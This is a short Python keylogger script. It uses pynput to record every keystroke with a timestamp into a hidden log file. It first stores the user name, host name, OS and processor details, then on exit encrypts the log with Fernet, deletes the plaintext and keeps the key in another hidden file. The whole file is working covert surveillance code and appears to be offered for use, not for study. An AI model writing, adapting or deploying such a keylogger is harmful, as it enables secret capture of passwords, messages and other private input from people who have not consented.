from pynput.keyboard import Listener
import datetime
import platform
import getpass
from cryptography.fernet import Fernet
import os

# Hidden log files
log_file = ".keystrokes.log"
encrypted_file = ".keystrokes_encrypted.log"
key_file_name = ".encryption_key.key"

# Generate encryption key
key = Fernet.generate_key()
cipher = Fernet(key)

# Save the encryption key
with open(key_file_name, "wb") as key_file:
    key_file.write(key)

# Get processor info with fallback
def get_processor_info():
    info = platform.processor()
    if not info:
        try:
            with open("/proc/cpuinfo", "r") as cpuinfo:
                for line in cpuinfo:
                    if "model name" in line:
                        return line.strip().split(":")[1].strip()
        except:
            return "Unknown"
    return info.strip()

# Write initial system info
with open(log_file, "a") as f:
    f.write("\n[LOG START] {}\n".format(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    f.write("USER: {}\n".format(getpass.getuser()))
    f.write("HOST: {}\n".format(platform.node()))
    f.write("OS: {} {}\n".format(platform.system(), platform.release()))
    f.write("PROCESSOR: {}\n".format(get_processor_info()))
    f.write("=" * 40 + "\n")

# Handle keypress logging
def on_press(key):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - {key.char}\n")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"{timestamp} - [{key}]\n")

# Encrypt the log file and delete the plain log
def encrypt_log_file():
    if os.path.exists(log_file):
        with open(log_file, "rb") as f:
            data = f.read()
        encrypted_data = cipher.encrypt(data)
        with open(encrypted_file, "wb") as ef:
            ef.write(encrypted_data)
        os.remove(log_file)  # Delete original unencrypted log
        print("[+] Log file encrypted successfully.")
    else:
        print("[-] Log file not found to encrypt.")

# Main listener wrapped in try-finally to ensure encryption runs
try:
    with Listener(on_press=on_press) as listener:
        listener.join()
finally:
    encrypt_log_file()
